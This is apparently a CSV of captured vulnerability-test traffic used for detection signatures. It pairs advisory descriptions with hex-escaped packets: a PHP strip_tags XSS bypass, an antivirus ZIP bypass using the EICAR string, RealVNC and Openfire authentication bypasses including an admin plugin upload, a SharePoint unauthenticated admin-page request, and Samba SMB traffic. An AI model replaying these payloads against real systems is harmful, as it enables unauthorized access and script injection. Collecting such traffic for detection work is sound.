XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040721-01_PHP_strip_tags()_Bypass_Vulnerability.xml,PHP strip_tags() Bypass Vulnerability,"A vulnerability exists in the HTML tag filtering method of  PHP. PHP does not properly filter tags containing a null byte, allowing potentially unsafe tags to be passed on to further processing. This vulnerability allows an attacker to inject malicious script and use the vulnerable PHP in a cross-site scripting attack.",HTTP,TCP,"GET /strip/getPoc.php?note=%3Cs%00cript%3Ealert%28%27Oops!%27%29%3B%3C%2Fs%00cript%3E HTTP/1.1||0D 0A ||Accept||3A || image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/msword, application/x-shockwave-flash, */*||0D 0A ||Referer||3A || http||3A ||//10.2.1.101/strip/getPoc.html||0D 0A ||Accept-Language||3A || en-us||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.0||3B || .NET CLR 1.1.4322)||0D 0A ||Host||3A || 10.2.1.101||0D 0A ||Connection||3A || Keep-Alive||0D 0A 0D 0A||"
FSC20040721-01_PHP_strip_tags()_Bypass_Vulnerability.xml,PHP strip_tags() Bypass Vulnerability,"A vulnerability exists in the HTML tag filtering method of  PHP. PHP does not properly filter tags containing a null byte, allowing potentially unsafe tags to be passed on to further processing. This vulnerability allows an attacker to inject malicious script and use the vulnerable PHP in a cross-site scripting attack.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Wed, 21 Jul 2004 22||3A ||35||3A ||07 GMT||0D 0A ||Server||3A || Apache/2.0.49 (Unix) PHP/4.3.7||0D 0A ||X-Powered-By||3A || PHP/4.3.7||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Transfer-Encoding||3A || chunked||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||c||0D 0A ||<html><body>||0D 0A ||34||0D 0A ||<p>I'm stripping tags, but allowing &lt||3B ||sub&gt||3B || </p>||0D 0A ||22||0D 0A ||<s||00 ||cript>alert('Oops!')||3B ||</s||00 ||cript>||0D 0A ||e||0D 0A ||</body></html>||0D 0A ||0||0D 0A 0D 0A||"
﻿FSC20041026-01_McAfee_Anti-Virus_Zip_Archive_Virus_Detection_Bypass.xml,McAfee Anti-Virus ZIP Archive Virus Detection Bypass,"There exists a vulnerability in the way McAfee Anti-Virus engine scans ZIP archives. The affected software may bypass file entries in a specially crafted ZIP file archive. An attacker can leverage this vulnerability to bypass the anti-virus protection and deliver malicious content to the target. If crafted ZIP file archive is delivered to a system which performs on-access scanning, the malicious content will be detected before it is executed, mitigating the impact of this vulnerability.            Note that this vulnerability also exists in several other Anti-Virus product lines from multiple vendors. The list of vendors with affected product lines includes Computer Associates, Kaspersky, Sophos, Eset, GeCAD Software. Please refer to Section 2 for further details.",HTTP,TCP,"GET /antivirus/poc.zip HTTP/1.1||0D 0A ||Host||3A || 10.2.1.79||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows||3B || U||3B || Windows NT 5.0||3B || en-US||3B || rv||3A ||1.7.3) Gecko/20040910||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
FSC20041026-01_McAfee_Anti-Virus_Zip_Archive_Virus_Detection_Bypass.xml,McAfee Anti-Virus ZIP Archive Virus Detection Bypass,"There exists a vulnerability in the way McAfee Anti-Virus engine scans ZIP archives. The affected software may bypass file entries in a specially crafted ZIP file archive. An attacker can leverage this vulnerability to bypass the anti-virus protection and deliver malicious content to the target. If crafted ZIP file archive is delivered to a system which performs on-access scanning, the malicious content will be detected before it is executed, mitigating the impact of this vulnerability.            Note that this vulnerability also exists in several other Anti-Virus product lines from multiple vendors. The list of vendors with affected product lines includes Computer Associates, Kaspersky, Sophos, Eset, GeCAD Software. Please refer to Section 2 for further details.",HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Tue, 26 Oct 2004 19||3A ||15||3A ||44 GMT||0D 0A ||Server||3A || Apache/2.0.47 (Fedora)||0D 0A ||Last-Modified||3A || Tue, 26 Oct 2004 19||3A ||12||3A ||16 GMT||0D 0A ||ETag||3A || ||22 ||24b11b-da-7cbf8400||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 218||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || application/zip||0D 0A 0D 0A ||PK||03 04 0A 00 00 00 00 00 F5 ||Z||03 ||1<||CF ||QhD||00 00 00 00 00 00 00 09 00 15 00 ||eicar.comUT||09 00 03 FD AD 0F ||A||FD AD 0F ||AUx||04 00 00 00 00 00 ||X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*PK||01 02 17 03 0A 00 00 00 00 00 F5 ||Z||03 ||1<||CF ||QhD||00 00 00 00 00 00 00 09 00 0D 00 00 00 00 00 01 00 00 00 A4 81 00 00 00 00 ||eicar.comUT||05 00 03 FD AD 0F ||AUx||00 00 ||PK||05 06 00 00 00 00 01 00 01 00 ||D||00 00 00 80 00 00 00 00 00||"
﻿FSC20060512-14_RealVNC_Password_Authentication_Bypass_Vulnerability.xml,RealVNC Password Authentication Bypass Vulnerability,"An authentication bypass vulnerability exists in the RealVNC server product. Specifically, the vulnerable application does not properly verify the chosen authentication methods sent to it by the client, resulting in a situation where the requirement for authentication is bypassed. An attacker can exploit this vulnerability by modifying a RealVNC client or by using traffic-modifying tools to connect to any RealVNC server without authentication.",VNC,TCP,||00 ||e||00 00 00 00 00 00 00 00 00 00 00 ||p||00 00 00 00 00 04 00 00 00 00 00 00 00 11 00 ||e||00 00 00 00 00 00 00 00 00 00 00 ||p||00 00 00 00 00 04 00 00 00 00 00 00 00 11 00 ||h||00 00 00 00 00 98 00 00 00 00 F9 C5 ||Y||08 ||AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
﻿FSC20081107-19_Jive_Software_Openfire_Jabber_Server_Authentication_Bypass.xml,Jive Software Openfire Jabber Server Authentication Bypass,An authentication bypass vulnerability exists in Openfire Server product by Jive Software. The vulnerability is due to an insecure design in the Tomcat filter where all functions in the admin web-interface are not protected from unauthorized access. Remote attackers could exploit this vulnerability to access functions in the admin web-interface without supplying valid credentials. A successful attack attempt will bypass the server authentication and the attacker can have full access to all functions in the admin webinterface without providing any user credentials. Thus the attacker can gain full control of the Openfire Jabber server and cause disclosure of sensitive information.,Jabber Admin Console over HTTP,TCP,"POST /setup/setup-/../../plugin-admin.jsp?uploadplugin HTTP/1.1||0D 0A ||Host||3A || 172.16.8.202||3A ||9090||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A ||Referer||3A || http||3A ||//172.16.8.202||3A ||9090/plugin-admin.jsp||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------108543102010202||0D 0A ||Content-Length||3A || 13360||0D 0A 0D 0A ||-----------------------------108543102010202||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||uploadfile||22 3B || filename=||22 ||emailListener.jar||22 0D 0A ||Content-Type||3A || application/octet-stream||0D 0A 0D 0A ||PK||03 04 0A 00 00 00 00 00 ||xw||9B ||7||00 00 00 00 00 00 00 00 00 00 00 00 09 00 04 00 ||META-INF/||FE CA 00 00 ||PK||03 04 0A 00 00 00 08 00 ||ww||9B ||7||94 89 ||<||8B ||^||00 00 00 ||j||00 00 00 14 00 00 00 ||META-INF/MANIFEST.MF||F3 ||M||CC CB ||LK-.||D1 0D ||K-*||CE CC CF B3 ||R0||D4 ||3||E0 E5 ||r||CC ||C||12 ||q,HL||CE ||HU||00 8A 01 ||%||CD F4 ||Ly||B9 9C 8B ||R||13 ||KRSt||9D ||*A||EA ||M||F5 0C E2 0D 0D ||u||93 0C 8C 15 ||4||82 ||K||F3 14 7C ||3||93 8B F2 8B ||+||8B ||KRs||8B 15 ||<||F3 92 F5 ||4y||B9 ||x||B9 00 ||PK||03 04 0A 00 00 00 00 00 ||xw||9B ||7||00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 ||lib/PK||03 04 0A 00 00 00 00 00 ||xw||9B ||7||00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 ||web/PK||03 04 0A 00 00 00 00 00 ||xw||9B ||7||00 00 00 00 00 00 00 00 00 00 00 00 0C 00 00 00 ||web/WEB-INF/PK||03 04 0A 00 00 00 08 00 ||ww||9B ||7||97 ||s'K||D2 01 00 00 B0 04 00 00 0E 00 00 00 ||changelog.html||A5 ||Tak||DB ||0||10 FD BC ||@||FE C3 ||-e||DF ||bK||CE CA 3A 1A CD B0 C6 81 14 B2 ||5||0C 8F D1 8F B2 ||}||B1 05 B2 ||dd||A5 ||M6||F6 DF ||'%||E9 ||B||8D D3 8D ||M`$||EB DE 9D DE ||=||F1 C4 ||^'w||B3 F4 ||~5||87 ||E||FA ||i||09 AB AF ||7||CB DB 19 8C 02 ||B||BE BD 9D 11 92 A4 C9 ||!p||19 ||RH||0D ||W||AD B0 ||B+.||09 99 ||||1E C5 C3 C1 ||p||C0 ||*[||CB D8 CF C8 0B ||7||BF ||bVX||89 F1 BC E6 ||B||C2 ||R||B4 16 15 1A ||X||C9 ||M)||14 CC ||*||AE ||J||94 BA ||d||E4 00 1B 0E C0 0D D6 DA 9D ||D||B0 BB 06 ||?||8C ||,n-||C9 DB ||vt||0C FA ||qs||97 DC C3 8F D3 BF 1F ||k||AD ||l||D0 8A EF 08 D7 10 ||Q||FA ||fz||0A FF 7C 9E ||9||86 ||4q||DF A2 B7 C2 9A D7 ||B||EE ||\||0D CB ||+]||F3 ||1<||A0 ||)||B8 ||r||0B ||n||04 97 ||c||A8 ||P>||A0 15 B9 DB ||i||9D 02 ||A||8B ||F||AC A7 E7 B9 D0 F0 ||=||D6 FD ||d||16 93 ||.||85 ||N||17 8D 9D F6 C5 1F ||Q||94 95 ||u||88 ||L||CB A2 8B ||hxQ||08 ||U||06 12 D7 1E 12 9D 3B FC E3 ||u||A5 ||]o]||06 ||^||EE A0 C0 ||\||1B EE EF D6 ||UPZ||E1 19 FE D1 DF ||I||F8 8F CA ||E||E1 E5 ||3||F2 9D FE ||{||DB CF B4 ||)||D0 04 99 B6 ||V||D7 BE ||F||B3 85 8B ||<||CF A1 D5 ||Rt||C1 ||OR||FD ||FO||9A ||m_||A7 A7 AD ||4}||B9 E3 ||\o||8C ||p||A2 ||*||7C ||<O||BC FF E2 ||r-||B5 ||q||A1 0B FA||"
﻿FSC20081209-16_Microsoft_Office_SharePoint_Server_ViewScopes.aspx_Mode_Handling_Security_Bypass.xml,Microsoft Office SharePoint Server ViewScopes.aspx Mode Handling Security Bypass,"A security bypass vulnerability exists in the Microsoft Office SharePoint Server (MOSS). The vulnerability is due to a design weakness that allows anonymous or unprivileged users to access certain administration functions of the server, effectively bypass security controls. A successful attack attempt will allow the attacker to bypass security controls and access  viewscopes.aspx  without providing any user credentials. The attacker can modify and create search scopes for the SharePoint site. The attacker could search confidential data and cause disclosure of sensitive information, or to supply a large scope that a search consumes all of the server's resources and cause a denial of service condition.",HTTP/HTTPS,TCP,"GET /_layouts/viewscopes.aspx?mode=ssp HTTP/1.1||0D 0A ||Host||3A || 2k3-office2k3||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux i686||3B || en-US||3B || rv||3A ||1.9b5) Gecko/2008041514 Firefox/3.0b5||0D 0A ||Accept||3A || text/html,application/xhtml+xml,application/xml||3B ||q=0.9,*/*||3B ||q=0.8||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
FSC20081209-16_Microsoft_Office_SharePoint_Server_ViewScopes.aspx_Mode_Handling_Security_Bypass.xml,Microsoft Office SharePoint Server ViewScopes.aspx Mode Handling Security Bypass,"A security bypass vulnerability exists in the Microsoft Office SharePoint Server (MOSS). The vulnerability is due to a design weakness that allows anonymous or unprivileged users to access certain administration functions of the server, effectively bypass security controls. A successful attack attempt will allow the attacker to bypass security controls and access  viewscopes.aspx  without providing any user credentials. The attacker can modify and create search scopes for the SharePoint site. The attacker could search confidential data and cause disclosure of sensitive information, or to supply a large scope that a search consumes all of the server's resources and cause a denial of service condition.",HTTP/HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Cache-Control||3A || private||0D 0A ||Content-Length||3A || 41133||0D 0A ||Content-Type||3A || text/html||3B || charset=utf-8||0D 0A ||Server||3A || Microsoft-IIS/6.0||0D 0A ||X-Powered-By||3A || ASP.NET||0D 0A ||MicrosoftSharePointTeamServices||3A || 12.0.0.4518||0D 0A ||X-AspNet-Version||3A || 2.0.50727||0D 0A ||Date||3A || Fri, 12 Dec 2008 18||3A ||33||3A ||12 GMT||0D 0A 0D 0A ||<HTML dir=||22 ||ltr||22 ||>||0D 0A ||<HEAD><meta name=||22 ||GENERATOR||22 || content=||22 ||Microsoft SharePoint||22 || /><meta name=||22 ||progid||22 || content=||22 ||SharePoint.WebPartPage.Document||22 || /><meta HTTP-EQUIV=||22 ||Content-Type||22 || content=||22 ||text/html||3B || charset=utf-8||22 || /><meta HTTP-EQUIV=||22 ||Expires||22 || content=||22 ||0||22 || /><title>||0D 0A 09 0D 0A 09 ||View Scopes||0D 0A 0D 0A ||</title><link rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || href=||22 ||/_layouts/1033/styles/portal.css?rev=FdkdOobdDRDcSGLoIQcflA%3D%3D||22 ||/>||0A ||<link rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 || href=||22 ||/_layouts/1033/styles/core.css?rev=5msmprmeONfN6lJ3wtbAlA%3D%3D||22 ||/>||0A ||<script type=||22 ||text/javascript||22 || language=||22 ||javascript||22 || src=||22 ||/_layouts/1033/init.js?rev=VhAxGc3rkK79RM90tibDzw%3D%3D||22 ||></script>||0A ||<script type=||22 ||text/javascript||22 || language=||22 ||javascript||22 || src=||22 ||/_layouts/1033/core.js?rev=F8pbQQxa4zefcW%2BW9E5g8w%3D%3D||22 ||></script>||0A ||<script type=||22 ||text/javascript||22 || language=||22 ||javascript||22 || src=||22 ||/_layouts/1033/search.js?rev=yqBjpvg%2Foi3KG5XVf%2FStmA%3D%3D||22 || defer></script>||0A ||<link type=||22 ||text/xml||22 || rel=||22 ||alternate||22 || href=||22 ||/_vti_bin/spsdisco.aspx||22 || /><style type=||22 ||text/css||22 ||>||0D 0A 09 ||.zz1_TopNavigationMenu_0 { background-color||3A ||white||3B ||visibility||3A ||hidden||3B ||display||3A ||none||3B ||position||3A ||absolute||3B ||left||3A ||0px||3B ||top||3A ||0px||3B || }||0D 0A 09 ||.zz1_TopNavigationMenu_1 { text-decoration||3A ||none||3B || }||0D 0A 09 ||.zz1"
FSC20081209-16_Microsoft_Office_SharePoint_Server_ViewScopes.aspx_Mode_Handling_Security_Bypass.xml,Microsoft Office SharePoint Server ViewScopes.aspx Mode Handling Security Bypass,"A security bypass vulnerability exists in the Microsoft Office SharePoint Server (MOSS). The vulnerability is due to a design weakness that allows anonymous or unprivileged users to access certain administration functions of the server, effectively bypass security controls. A successful attack attempt will allow the attacker to bypass security controls and access  viewscopes.aspx  without providing any user credentials. The attacker can modify and create search scopes for the SharePoint site. The attacker could search confidential data and cause disclosure of sensitive information, or to supply a large scope that a search consumes all of the server's resources and cause a denial of service condition.",HTTP/HTTPS,TCP,uickLaunchMenu_Data.verticalOffset = 0||3B 0D 0A ||//]]>||0D 0A ||</script>||0D 0A ||<SCRIPT>||0D 0A ||ctx = new ContextInfo()||3B 0D 0A ||ctx.ctxType = CTXTYPE_EDITMENU||3B 0D 0A ||ctx.listBaseType = 0||3B 0D 0A ||ctx.listTemplate = 301||3B 0D 0A ||ctx.listName = ''||3B 0D 0A ||ctx.view = ''||3B 0D 0A ||ctx.listUrlDir = ''||3B 0D 0A ||ctx.HttpPath = ''||3B 0D 0A ||ctx.HttpRoot = ''||3B 0D 0A ||ctx.imagesPath = '\u002f_layouts\u002fimages\u002f'||3B 0D 0A ||ctx.PortalUrl = ''||3B 0D 0A ||ctx.SendToLocationName = ''||3B 0D 0A ||ctx.SendToLocationUrl = ''||3B 0D 0A ||ctx.RecycleBinEnabled = -1||3B 0D 0A ||ctx.OfficialFileName = ''||3B 0D 0A ||ctx.WriteSecurity = '1'||3B 0D 0A ||ctx.SiteTitle = ''||3B 0D 0A ||ctx.ListTitle = ''||3B 0D 0A ||if (ctx.PortalUrl == '') ctx.PortalUrl = null||3B 0D 0A ||ctx.displayFormUrl = ''||3B 0D 0A ||ctx.editFormUrl = ''||3B 0D 0A ||ctx.isWebEditorPreview = 0||3B 0D 0A ||ctx.ctxId = 1||3B 0D 0A ||g_ViewIdToViewCounterMap[ '{5B760CA3-9E99-424B-B17F-5B69DAC72E43}' ]= 1||3B 0D 0A ||ctx.CurrentUserId = 0||3B 0D 0A 0D 0A ||ctx.isModerated = false||3B 0D 0A || ||0D 0A ||ctx1 = ctx||3B 0D 0A ||</SCRIPT></form>||0D 0A ||  ||0D 0A ||</BODY>||0D 0A ||</HTML>||0D 0A||
﻿FSC20090105-11_Samba_Root_File_System_Access_Security_Bypass.xml,Samba Root File System Access Security Bypass,"A security bypass vulnerability exists in Samba. The vulnerability is due to a design weakness when registry based share definition is enabled. A remote attacker may leverage this vulnerability to gain read-only access to the local file system in the security context of the Samba service. In the case of a successful attack, a remote attacker may gain read-only access the root directory on the target system in the security context of the Samba service.",SMB,TCP,||00 00 00 B3 FF ||SMBr||00 00 00 00 08 01 C8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3A 0A 00 00 01 00 00 90 00 02 ||PC NETWORK PROGRAM 1.0||00 02 ||MICROSOFT NETWORKS 1.03||00 02 ||MICROSOFT NETWORKS 3.0||00 02 ||LANMAN1.0||00 02 ||LM1.2X002||00 02 ||DOS LANMAN2.1||00 02 ||Samba||00 02 ||NT LANMAN 1.0||00 02 ||NT LM 0.12||00||
